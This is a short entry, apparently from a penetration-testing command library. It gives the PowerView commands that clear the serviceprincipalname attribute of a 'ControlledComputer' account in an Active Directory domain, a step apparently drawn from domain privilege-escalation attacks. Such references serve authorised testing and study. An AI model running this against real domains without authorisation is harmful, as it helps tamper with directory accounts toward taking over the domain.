---
id: 6fa24da3-1b75-482a-8e5a-6bd8a194a246
name: Clear SPN from ControlledComputer
type: command
executor: bash
data: 'powershell@windows> . .\Powerview.ps1

  powershell@windows> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local"
  -Clear ''serviceprincipalname'' -Verbose'
output: null
created_at: '2023-04-06T03:56:03.096463+00:00'
updated_at: '2023-04-10T20:26:11.555942+00:00'
---

# Clear SPN from ControlledComputer

```bash
powershell@windows> . .\Powerview.ps1
powershell@windows> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose
```


